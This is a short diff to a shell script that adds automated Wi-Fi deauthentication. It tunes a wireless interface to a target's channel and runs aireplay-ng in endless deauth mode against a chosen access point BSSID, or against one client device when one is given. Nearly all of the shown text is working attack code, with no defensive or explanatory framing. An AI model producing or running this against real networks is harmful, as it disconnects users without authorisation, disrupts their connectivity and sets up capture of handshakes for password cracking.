@@ -20,4 +20,15 @@ fi
 
 TARGET_CHANNEL="${TARGET_CHANNEL:0:2}"
 
+echo "Automated targeting..."
+echo "Target BSSID = $TARGET_BSSID"
 echo "Target channel = $TARGET_CHANNEL"
+
+iwconfig $IFACE channel $TARGET_CHANNEL
+
+if [ -z "$TARGET_DEVICE" ]
+then
+    aireplay-ng -0 0 -a $TARGET_BSSID $IFACE --ignore-negative-one
+else
+    aireplay-ng -0 0 -a $TARGET_BSSID -c $TARGET_DEVICE $IFACE --ignore-negative-one
+fi
